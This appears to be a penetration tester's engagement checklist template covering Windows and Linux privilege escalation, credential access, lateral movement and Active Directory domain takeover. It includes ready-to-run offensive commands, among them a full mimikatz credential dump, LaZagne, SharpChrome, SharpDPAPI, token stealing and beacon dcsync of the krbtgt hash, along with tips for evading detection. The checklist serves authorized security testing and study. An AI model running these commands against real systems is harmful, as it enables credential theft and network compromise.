		PowerShell `# Get-CimInstance -ClassName Win32_Service | Where-Object { $_.PathName -notlike '"*' and $_.StartMode -eq 'Auto' -and $_.PathName -like '* *' -and $_.PathName -notlike 'C:\Windows\*'} | Select-Object Name, PathName`
			-
		Manually Check (Look at Installed Apps and probe)
			-

Weak Service Permissions 
	Enumerate services `# Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
		or... `sc_enum`
		-
	Check file service perms `# icacls`
		-
	Check service registry perms (FullControl) `# Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService` 
		-

DLL Hijacking `#procmon - Check for missing DLLs OR place evil dll higher in hierarchy`
	-

Software Vulnerabilities
	Unsafe Deserialization
		-

User Account Control (UAC)
	CMSTPLUA UAC Bypass
		-

ChangeConfig Service Right Abuse (See [[Services]])
	`Import-Module .\Get-ServiceAcl.ps1`
	`"<Service>" | Get-ServiceAcl | select -ExpandProperty Access`
		-

Scheduled Tasks  `# schtasks  |  schtasks /query /fo LIST /v  |  Get-ScheduledTask
	-
	Hunt for specific users -- `Get-ScheduledTask | Where-Object -Property Author -match <user> | fl *`
		-
	`Get-ScheduledTask | Select-Object Author,Trigger,Action,TaskName,TaskPath,Source,Principal | fl`
		-
	TaskScheduler -- `#GUI - look at author, trigger, action, etc...`
		-

Medium Integrity credential access
	Cred from web browsers `.\SharpChrome.exe logins`
		-
	Windows Cred Manager
		Enumerate for creds `.\Seatbelt.exe WindowsVault`
			-
		Decrypt creds `.\SharpDPAPI.exe credentials /rpc`
			-

Manual Enumeration: `# dir /a /q`
	`\directory\we\spawn\in    # and adjacents`
		-
	`\Users\<user>\AppData\stuff
		-
	`\Users\<user>\<all_files>
		-
	`\Users\<users>
		-
	`\
		-
	`\xampp`
		-

Search for specific files `# Use Get-ChildItem premade queries from master checklist` See [[Looting]]
	Config Files
		-
	kdbx files
		-
	.txt, .ini files
		-
	home dir recursive search for creds/databases
		-
	zip files
		-
	SAM/SYSTEM/SECURITY
		-

Automations
.\winPEASany.exe `# also winPEAS.ps1... PARSE CAREFULLY... AlwaysInstallElevated...
	-

.\LaZagne.exe all
	-

.\jaws-enum.ps1
	-

Import-Module .\PowerUp.ps1
	`Invoke-AllChecks`
		-
	`Get-ModifiableServiceFile
		-
	`Get-UnquotedService`
		-

windows exploit suggester
	-
#### Linux:
hostname
	-

whoami
	-

id
	-

sudo -V
	-

sudo -l
	-

env
	-

history
	-

/etc/passwd
	users
		-
	file perms
		-

/etc/shadow
	-

/etc/sudoers
	-

switch user `# su -l <user>`
	`user:user` cred combinations
		-
	credential reuse
		-
	ssh reuse
		-

os/kernel version info `# is gcc present?` [[OSCP Prep/Methodology Notes/PrivEsc/Kernel Exploits|Kernel Exploits]]
	-
	`searchsploit #.#.#-###`
		-
	google
		-

system processes `# ps aux`
	-

interfaces `# ip a`
	-

routes `# routel`
	-

ports `# internally exposed ports? chisel! webapps? conf files, LFI + rev shell, etc..
	-

multiple webservers `# check /var/www and check /etc/apache2/sites-enabled or /etc/nginx/sites-enabled`
	NOTE: vhost could share same port but only be accessible from localhost `# ie: port-forward`
	-

scheduled tasks `# pspy64 automated, crontab -l, cat /var/log/syslog | grep -i cron`
	-

installed packages `# dpkg -l`
	-

world writable directories `# find / -writable -type d 2>/dev/null`
	-

mounted drives `# cat /etc/fstab, lsblk`
	-

list loaded drivers `# lsmod`
	-

SUID files `# find / -perm -u=s -type f 2>/dev/null`
	-

Password Reuse `# identified passes/strings go here`
	-
	redo `sudo -l` if password was required
		-
	local db auth
		-
	switch users `# su -l <user>   AND   ssh <user>@<ip>`
		-
	misc
		-

Manual Enum:  `# consider ls -laiRtu

`/directory/we/spawn/in`    `# and adjacent ones`
	-
`/home/<user>
	-
`/home
	-
`/`
	-
`/opt`
	-
`/var`      `# www/, mail/, etc... cred hunting galore`
	-
anything else of interest
	-


Config files and information within:
	-

.db search `# find / -name *.db 2>/dev/null      ## also *db*, *database*, etc...`
	-

.sql search `# find / -name *.sql 2>/dev/null      ## also *sql*, etc...
	-

.conf search `# find / -name *.conf 2>/dev/null      ## also *conf*, *cfg*, etc...`
	-

Fire `./linpeas.sh > /tmp/linpeas.txt`
	manually parse
		-
	`grep -i pass
		-
#### Automated:
```
peas

LaZagne.exe all

SharpUp.exe audit

```



## Privilege Escalation
```
Document PrivEsc Attempts in this section
```
#### Attempt 1:
## Elevated Persistence
```
Establish and document elevated persistence method here.
OPSEC? - WMI Event Subscription
```

## Credential Access

```
OPSEC? DON'T DUMP LSASS BRO... otherwise mimikatz ;)
```

Medium Integrity cred access
	Cred from web browsers
		-
	Windows Cred Manager
		-

High Integrity cred access
	Kerberos `# Triage targets first for OPSEC`
		Targeted asreproast
			-
		Targeted kerberoast
			-
		Dump tickets from memory (does not touch LSASS :))
			-
		Renew TGTs if needed
			-

OS Credential Dumping 
```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::credman" "sekurlsa::ekeys" "lsadump::sam" "lsadump::lsa" "lsadump::cache" "lsadump::secrets" "exit"
```

LaZagne.exe
```powershell
.\LaZagne.exe all
```

## User Impersonation
```powershell
# NOTE: use token-store whenever we impersonate
token-store steal [PID]
token-store use [ID]
```

High-Integrity
	Token Impersonation 
		-
	Process Injection
		-

PtH
	-

PtT
	-

PtC
	-

## Discovery
#### BloodHound
SharpHound `BAD OPSEC`
	-

BOFHound Collection
	-

Restricted Groups
	-

WMI Filters
	-
#### LDAP Queries
###### Domain Information
```
```
###### Kerberos
Unconstrained Delegation
	Identification
		-
	Standard
		-
	S4U2Self Computer Takeover
		-

Constrained Delegation
	Identification
		-
	Standard
		-
	Service Name Substitution
		-

Resource Based Constrained Delegation
	-

Silver Ticket (to impersonate rather than persistence) `# NOT GOOD OPSEC...`
	-
###### MSSQL
MSSQL Server Identification
	if present, proceed to [MSSQL](#MSSQL)

## Lateral Movement

WinRM
	-

SCShell (PSExec is BAD)
	-

MavInject
	-

#### C2
Reference [[10 Lateral Movement]]
#### Without C2
winrm, psexec, etc...

## Pivoting

Enumerate interfaces for Internal networks
	-

SOCKS
	-

Reverse Port Forward
	-

Ligolo-ng
	-
## MSSQL

Present?
	-

Code Exec
	SQL CLR (best opsec)
		-
	OLE Automation
		-
	xp_cmdshell
		-

Linked Servers?
	-

Priv Esc
	-

## Domain Dominance

DCSync
```powershell
# impersonate a domain admin
beacon> make_token [DOMAIN]\[user] [password]

# dc sync -- capture domain krbtgt hash
beacon> dcsync [domain.com] [DOMAIN]\krbtgt

# dc sync -- capture computer account
beacon> dcsync [domain.com] [DOMAIN]\[hostname]$
```

Ticket Forgery for Persistence
	Silver Ticket
		-
	Golden Ticket
		-
	Diamond Ticket `BEST OPSEC`
		-

DPAPI Backup Keys
	-

## Forest and Domain Trusts

Enumerate Trust Accounts
```powershell
ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
	# TrustDirection = 1 -> proceed to One-Way Inbound Trusts
	# TrustDirection = 2 -> proceed to One-Way Outbound Trusts
	# TrustDirection = 3 -> proceed to Parent-Child Tickets
```

Parent Child Tickets
	-

One-Way Inbound Trusts
	-

One-Way Outbound Trusts
	-

## Lessons Learned
```
Annotate any lessons learned from this engagement here
```